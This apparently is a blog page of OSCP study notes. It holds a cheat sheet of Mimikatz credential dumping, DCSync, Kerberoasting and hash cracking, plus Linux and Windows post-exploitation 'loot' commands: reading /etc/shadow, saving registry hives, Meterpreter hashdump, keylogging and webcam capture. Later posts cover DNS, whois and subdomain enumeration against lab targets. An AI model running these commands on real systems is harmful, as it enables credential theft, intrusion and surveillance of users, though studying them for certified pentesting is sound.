<div class="highlight"><pre><span></span><code>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 # Cheat Sheet
</code></pre></div>

<h3>Bloodhound</h3>
<div class="highlight"><pre><span></span><code><span class="nv">AzureHound</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">Azure</span><span class="w"> </span><span class="nv">Active</span><span class="w"> </span><span class="nv">Directory</span><span class="w"> </span>#<span class="w"> </span><span class="nv">Install</span><span class="o">-</span><span class="nv">Module</span><span class="w"> </span><span class="o">-</span><span class="nv">name</span><span class="w"> </span><span class="nv">Az</span><span class="w"> </span><span class="o">-</span><span class="nv">AllowClobber</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nv">Install</span><span class="o">-</span><span class="nv">Module</span><span class="w"> </span><span class="o">-</span><span class="nv">name</span><span class="w"> </span><span class="nv">AzureADPreview</span><span class="w"> </span><span class="o">-</span><span class="nv">AllowClobber</span>

<span class="nv">SharpHound</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">local</span><span class="w"> </span><span class="nv">Active</span><span class="w"> </span><span class="nv">Directory</span><span class="w"> </span>#<span class="w"> </span><span class="nv">run</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">collector</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">machine</span><span class="w"> </span><span class="nv">using</span><span class="w"> </span><span class="nv">SharpHound</span>

<span class="s2">&quot;Invoke-BloodHound -CollectionMethod All  -Domain &lt;DomainName&gt; -ZipFileName &lt;file.zip&gt;&quot;</span><span class="w"> </span>#<span class="w"> </span><span class="nv">copy</span><span class="w"> </span><span class="nv">zip</span><span class="w"> </span><span class="nv">over</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">attack</span><span class="w"> </span><span class="nv">machine</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">run</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">neo4j</span><span class="w"> </span><span class="nv">DB</span>
</code></pre></div>

<h3>Mimikatz Commands</h3>
<p>https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  #Kerberoasting Cheatsheet</p>
<div class="highlight"><pre><span></span><code><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span><span class="w">  </span><span class="c1">#Check Architecture for for correct mimikatz version</span>

<span class="c1">#Password / Hash Grabbing Techniques</span>
<span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span><span class="w">  </span><span class="c1">#Dump cached passwords from logins</span>

<span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span><span class="w"> </span><span class="c1">#Dumps passwords/hashes in sam file</span>
<span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span><span class="w"> </span><span class="c1">#Dumps passwords</span>

<span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">jeff_admin</span><span class="w"> </span><span class="c1">#Creates a ntlm hash from DC for lateral move</span>

<span class="c1">## Invoke-Mimikatz</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="w"> </span><span class="o">-</span><span class="n">DumpCreds</span><span class="w"> </span><span class="o">-</span><span class="n">ComputerName</span><span class="w"> </span><span class="n">XOR</span><span class="o">-</span><span class="n">APP59</span><span class="w">  </span>

<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="w"> </span><span class="o">-</span><span class="n">Command</span><span class="w"> </span><span class="s1">&#39;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;&#39;</span>

<span class="c1">## Ticket Grabbing</span>
<span class="n">net</span><span class="w"> </span><span class="n">use</span><span class="w"> </span>\\<span class="n">dc01</span><span class="w"> </span><span class="c1">#Creates a TGS with a domain user</span>

<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span><span class="w">  </span><span class="c1">#Run with mimikatz</span>
<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span><span class="w"> </span><span class="o">/</span><span class="k">export</span>

<span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Public</span>\<span class="n">Documents</span><span class="o">&gt;</span><span class="w"> </span><span class="n">klist</span><span class="w">  </span><span class="c1">#klist dumps tickets in powershell</span>

<span class="c1">#Invoke-Kerberoast.ps1 to dump tickets:</span>

<span class="n">Import</span><span class="o">-</span><span class="n">Module</span><span class="w"> </span><span class="o">.</span>\<span class="n">Invoke</span><span class="o">-</span><span class="n">Kerberoast</span><span class="o">.</span><span class="n">ps1</span>

<span class="n">Next</span><span class="w"> </span><span class="n">type</span><span class="p">:</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Public</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">Kerberoast</span><span class="o">.</span><span class="n">ps1</span>

<span class="c1">#Grabbing ticket hashes for hashcat:</span>

<span class="n">Invoke</span><span class="o">-</span><span class="n">Kerberoast</span><span class="w"> </span><span class="o">-</span><span class="n">OutputFormat</span><span class="w"> </span><span class="n">Hashcat</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="o">$</span><span class="n">_</span><span class="o">.</span><span class="n">Hash</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="o">-</span><span class="n">File</span><span class="w"> </span><span class="o">-</span><span class="n">Encoding</span><span class="w"> </span><span class="n">ascii</span><span class="w"> </span><span class="n">hashes</span><span class="o">.</span><span class="n">hashcat</span>

<span class="n">hashcat</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="mi">13100</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">cracked</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="n">hashes</span><span class="o">.</span><span class="n">hashcat</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="w">  </span><span class="c1">##Use SMBserver to transfer hashes</span>

<span class="c1"># Grabbing tickets for john:</span>

<span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Tools</span>\<span class="n">active_directory</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">Kerberoast</span><span class="w"> </span><span class="o">-</span><span class="n">OutputFormat</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="o">-</span><span class="n">ExpandProperty</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">|%</span><span class="w"> </span><span class="p">{</span><span class="o">$</span><span class="n">_</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="s1">&#39;:$krb5tgs$23$&#39;</span><span class="p">)}</span>

<span class="n">sudo</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="o">--</span><span class="n">format</span><span class="o">=</span><span class="n">krb5tgs</span><span class="w"> </span><span class="nb">hash</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="w">  </span><span class="c1">#Use SMBserver to transfer hashes </span>
</code></pre></div>

<h1><strong>Loot</strong></h1>
<h2>Linux</h2>
<p><strong>Checklist</strong></p>
<ul>
<li>Proof:</li>
<li>Network secret:</li>
<li>Passwords and hashes:</li>
<li>Dualhomed:</li>
<li>Tcpdump:</li>
<li>Interesting files:</li>
<li>Databases:</li>
<li>SSH-keys:</li>
<li>Browser:</li>
<li>Mail:</li>
</ul>
<h3>Proof</h3>
<div class="highlight"><pre><span></span><code>echo -e &#39;\n&#39;HOSTNAME:   &amp;&amp; hostname &amp;&amp; echo -e &#39;\n&#39;WHOAMI:   &amp;&amp; whoami &amp;&amp; echo -e &#39;\n&#39;PROOF:  &amp;&amp; cat proof.txt &amp;&amp; echo -e &#39;\n&#39;IFCONFIG:  &amp;&amp; /sbin/ifconfig &amp;&amp; echo -e &#39;\n&#39;PASSWD:  &amp;&amp; cat /etc/passwd &amp;&amp; echo -e &#39;\n&#39;SHADOW:  &amp;&amp; cat /etc/shadow &amp;&amp; echo -e &#39;\n&#39;NETSTAT:  &amp;&amp; netstat -antup
</code></pre></div>

<h3>Local</h3>
<div class="highlight"><pre><span></span><code><span class="nx">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="o">-</span><span class="nx">name</span><span class="w"> </span><span class="nx">local</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="mi">2</span><span class="p">&gt;</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span>

<span class="nx">cat</span><span class="w"> </span><span class="nx">local</span><span class="p">.</span><span class="nx">txt</span>
</code></pre></div>

<h3>Network secret</h3>
<div class="highlight"><pre><span></span><code>/root/network-secret.txt
</code></pre></div>

<h3>Passwords and hashes</h3>
<div class="highlight"><pre><span></span><code>cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow &gt; unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
</code></pre></div>

<h3>Dualhomed</h3>
<div class="highlight"><pre><span></span><code>ifconfig
ifconfig -a
arp -a
</code></pre></div>

<h3>Tcpdump</h3>
<div class="highlight"><pre><span></span><code>tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
</code></pre></div>

<h3>Interesting files</h3>
<div class="highlight"><pre><span></span><code><span class="c1">#Meterpreter</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">txt</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">zip</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">doc</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">xls</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="no">config</span><span class="p">*</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">rar</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">docx</span>
<span class="nf">search</span><span class="w"> </span><span class="p">-</span><span class="no">f</span><span class="w"> </span><span class="p">*.</span><span class="no">sql</span>
<span class="nf">use</span><span class="w"> </span><span class="no">auxiliary</span><span class="err">/</span><span class="no">sniffer</span><span class="err">/</span><span class="no">psnuffle</span>

<span class="nl">.ssh:</span>
<span class="na">.bash_history</span>
</code></pre></div>

<h3>Databases</h3>
<h3>SSH-Keys</h3>
<h3>Browser</h3>
<h3>Mail</h3>
<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span>
<span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">mail</span>
</code></pre></div>

<h3>GUI</h3>
<p>If there is a gui we want to check out the browser.</p>
<div class="highlight"><pre><span></span><code>echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
</code></pre></div>

<h2>Windows</h2>
<h3>Proof</h3>
<div class="highlight"><pre><span></span><code><span class="nx">hostname</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">whoami</span><span class="p">.</span><span class="nx">exe</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="nx">proof</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">ipconfig</span><span class="w"> </span><span class="o">/</span><span class="nx">all</span>

<span class="nx">PS</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">administrator</span><span class="p">.</span><span class="nx">xor</span><span class="err">\</span><span class="nx">Desktop</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">hostname</span><span class="p">;</span><span class="w"> </span><span class="nx">whoami</span><span class="p">.</span><span class="nx">exe</span><span class="p">;</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="nx">proof</span><span class="p">.</span><span class="nx">txt</span><span class="p">;</span><span class="w"> </span><span class="nx">ipconfig</span><span class="w"> </span><span class="o">/</span><span class="nx">all</span>
</code></pre></div>

<h3>Passwords and hashes</h3>
<div class="highlight"><pre><span></span><code><span class="n">wce32</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">w</span>
<span class="n">wce64</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">w</span>
<span class="n">fgdump</span><span class="o">.</span><span class="n">exe</span>

<span class="c1"># Loot passwords without tools</span>
<span class="n">reg</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm</span>\<span class="n">sam</span><span class="w"> </span><span class="n">c</span><span class="p">:</span>\<span class="n">sam_backup</span>
<span class="n">reg</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm</span>\<span class="n">security</span><span class="w"> </span><span class="n">c</span><span class="p">:</span>\<span class="n">security_backup</span>
<span class="n">reg</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm</span>\<span class="n">system</span><span class="w"> </span><span class="n">c</span><span class="p">:</span>\<span class="n">system</span>

<span class="c1"># Meterpreter</span>
<span class="n">hashdump</span>
<span class="nb">load</span><span class="w"> </span><span class="n">mimikatz</span>
<span class="n">msv</span>
</code></pre></div>

<h3>Dualhomed</h3>
<div class="highlight"><pre><span></span><code>ipconfig /all
route print

# What other machines have been connected
arp -a
</code></pre></div>

<h3>Tcpdump</h3>
<div class="highlight"><pre><span></span><code># Meterpreter
run packetrecorder -li
run packetrecorder -i 1
</code></pre></div>

<h3>Interesting files</h3>
<div class="highlight"><pre><span></span><code><span class="gh">#</span>Meterpreter
search -f <span class="gs">*.txt</span>
<span class="gs">search -f *</span>.zip
search -f <span class="gs">*.doc</span>
<span class="gs">search -f *</span>.xls
search -f config*
search -f <span class="gs">*.rar</span>
<span class="gs">search -f *</span>.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

<span class="gh">#</span> How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

<span class="gh">#</span> Recursive search
dir /s
</code></pre></div>

<div class="highlight"><pre><span></span><code>  Stapler _ VulnHub
</code></pre></div>
                <div class="clear"></div>

                <div class="info">
                    <a href="https://sfinx.kozow.com/oscp-notes.html">posted at 21:46</a>
                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/ghost.html" rel="tag">GHOST</a>
                </div>
            </article>            <h4 class="date">May 09, 2024</h4>

            <article class="post">
                <h2 class="title">
                    <a href="https://sfinx.kozow.com/passive-enumeration.html" rel="bookmark" title="Permanent Link to &quot;Passive Enumeration&quot;">Passive Enumeration</a>
                </h2>

                
                

                <h3>WHOIS Enumeration</h3>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">whois</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">-h</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">251</span>
<span class="n">Domain</span> <span class="n">Name</span><span class="p">:</span> <span class="n">MEGACORPONE</span><span class="p">.</span><span class="n">COM</span>
<span class="n">Registry</span> <span class="n">Domain</span> <span class="n">ID</span><span class="p">:</span> <span class="n">1775445745_DOMAIN_COM-VRSN</span>
<span class="n">Registrar</span> <span class="n">WHOIS</span> <span class="n">Server</span><span class="p">:</span> <span class="n">whois</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span>
<span class="n">Registrar</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span>
<span class="n">Updated</span> <span class="n">Date</span><span class="p">:</span> <span class="n">2019</span><span class="p">-</span><span class="n">01</span><span class="p">-</span><span class="n">01T09</span><span class="p">:</span><span class="n">45</span><span class="p">:</span><span class="n">03Z</span>
<span class="n">Creation</span> <span class="n">Date</span><span class="p">:</span> <span class="n">2013</span><span class="p">-</span><span class="n">01</span><span class="p">-</span><span class="n">22T23</span><span class="p">:</span><span class="n">01</span><span class="p">:</span><span class="n">00Z</span>
<span class="n">Registry</span> <span class="n">Expiry</span> <span class="n">Date</span><span class="p">:</span> <span class="n">2023</span><span class="p">-</span><span class="n">01</span><span class="p">-</span><span class="n">22T23</span><span class="p">:</span><span class="n">01</span><span class="p">:</span><span class="n">00Z</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">whois</span> <span class="n">38</span><span class="p">.</span><span class="n">100</span><span class="p">.</span><span class="n">193</span><span class="p">.</span><span class="n">70</span> <span class="n">-h</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">251</span>
<span class="p">...</span>
<span class="n">NetRange</span><span class="p">:</span>
<span class="n">38</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="p">-</span> <span class="n">38</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">255</span>
<span class="n">CIDR</span><span class="p">:</span>
<span class="n">38</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">8</span>
</code></pre></div>

<h3>Google Hacking</h3>
<ul>
<li>site:megacorpone.com</li>
<li>ext:php</li>
<li>filetype:html</li>
<li>intitle:"index of" "parent directory"</li>
<li>https://www.exploit-db.com/google-hacking-database</li>
</ul>
<h3>Netcraft</h3>
<p>Let’s review some of Netcraft’s capabilities. For example, we can use Netcraft’s DNS search page
(https://searchdns.netcraft.com) to gather information about the megacorpone.com domain.</p>
<h3>Open-Source Code</h3>
<p>This includes open-source projects and online code repositories such as GitHub, GitHub Gist, GitLab, and SourceForge</p>
<p>Once we’ve logged in to our Github account, we can search MegaCorp One’s repos for interesting
information. Let’s use filename:users to search for any files with the word “users” in the name.</p>
<p>For larger repos, we can use several tools to
help automate some of the searching, such as Gitrob and Gitleaks. Most of these tools
require an access tokento use the source code-hosting provider’s API.</p>
<blockquote>
<p>Tools that search through source code for secrets, like Gitrob or Gitleaks,
  generally rely on regular expressions or entropy233-based detections to identify
  potentially useful information. Entropy-based detection attempts to find strings
  that are randomly generated. The idea is that a long string of random characters
  and numbers is probably a password. No matter how a tool searches for secrets,
  no tool is perfect and they will miss things that a manual inspection might find.</p>
</blockquote>
<h3>Shodan</h3>
<ul>
<li>hostname:megacorpone.com.</li>
<li>port:"22"</li>
</ul>
<h3>Security Headers and SSL/TLS</h3>
<p>One such site, Security Headers will analyze HTTP response headers and provide basic
analysis of the target site’s security posture. We can use this to get an idea of an organization’s
coding and security practices based on the results.
Let’s scan www.megacorpone.com and check the results.</p>
                <div class="clear"></div>

                <div class="info">
                    <a href="https://sfinx.kozow.com/passive-enumeration.html">posted at 02:09</a>
                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/oscp.html" rel="tag">OSCP</a>
                </div>
            </article>            <h4 class="date">May 08, 2024</h4>

            <article class="post">
                <h2 class="title">
                    <a href="https://sfinx.kozow.com/active-enumeration.html" rel="bookmark" title="Permanent Link to &quot;Active Enumeration&quot;">Active Enumeration</a>
                </h2>

                
                

                <h3>DNS Enumeration</h3>
<ul>
<li><strong>NS</strong>: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.</li>
<li><strong>A</strong>: Also known as a host record, the “a record” contains the IPv4 address of a hostname (such as www.megacorpone.com)</li>
<li><strong>AAAA</strong>: Also known as a quad A host record, the “aaaa record” contains the IPv6 address of a hostname (such as www.megacorpone.com).</li>
<li><strong>MX</strong>: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.</li>
<li><strong>PTR</strong>: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.</li>
<li><strong>CNAME</strong>: Canonical Name Records are used to create aliases for other host records.</li>
<li><strong>TXT</strong>: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">-t</span> <span class="n">mx</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">10</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span><span class="p">.</span>
<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">20</span> <span class="n">spool</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span><span class="p">.</span>
<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">50</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">60</span> <span class="n">mail2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">-t</span> <span class="n">txt</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">descriptive</span> <span class="n">text</span> <span class="s2">&quot;Try Harder&quot;</span>
<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">descriptive</span> <span class="n">text</span> <span class="s2">&quot;google-site-</span>
<span class="s2">verification=U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA&quot;</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">idontexist</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="n">Host</span> <span class="n">idontexist</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dig</span> <span class="nv">@nagoya</span><span class="p">.</span><span class="n">nagoya-industries</span><span class="p">.</span><span class="n">com</span> <span class="n">nagoya-industries</span><span class="p">.</span><span class="n">com</span> <span class="p">+</span><span class="n">tcp</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span>
<span class="n">www</span>
<span class="n">ftp</span>
<span class="n">mail</span>
<span class="n">owa</span>
<span class="n">proxy</span>
<span class="n">router</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span> <span class="k">do</span> <span class="n">host</span> <span class="nv">$ip</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">;</span> <span class="n">done</span>
<span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>
<span class="n">Host</span> <span class="n">ftp</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
<span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">212</span>
<span class="n">Host</span> <span class="n">owa</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
<span class="n">Host</span> <span class="n">proxy</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
<span class="n">router</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">214</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">wfuzz</span> <span class="n">-w</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dnsmap</span><span class="p">.</span><span class="n">txt</span> <span class="n">-u</span> <span class="n">http</span><span class="p">://</span><span class="n">devvortex</span><span class="p">.</span><span class="n">htb</span> <span class="n">-H</span> <span class="s1">&#39;Host: FUZZ.devvortex.htb&#39;</span> <span class="n">-t</span> <span class="n">50</span> <span class="p">-</span><span class="n">-hc</span> <span class="n">302</span>

<span class="p">********************************************************</span>
<span class="p">*</span> <span class="n">Wfuzz</span> <span class="n">3</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">0</span> <span class="p">-</span> <span class="n">The</span> <span class="n">Web</span> <span class="n">Fuzzer</span>                         <span class="p">*</span>
<span class="p">********************************************************</span>

<span class="n">Target</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">devvortex</span><span class="p">.</span><span class="n">htb</span><span class="p">/</span>
<span class="n">Total</span> <span class="n">requests</span><span class="p">:</span> <span class="n">17576</span>

<span class="p">=====================================================================</span>
<span class="n">ID</span>           <span class="n">Response</span>   <span class="n">Lines</span>    <span class="n">Word</span>       <span class="n">Chars</span>       <span class="n">Payload</span>                     
<span class="p">=====================================================================</span>

<span class="n">000002154</span><span class="p">:</span>   <span class="n">200</span>        <span class="n">501</span> <span class="n">L</span>    <span class="n">1581</span> <span class="n">W</span>     <span class="n">23221</span> <span class="n">Ch</span>    <span class="s2">&quot;dev&quot;</span>
</code></pre></div>

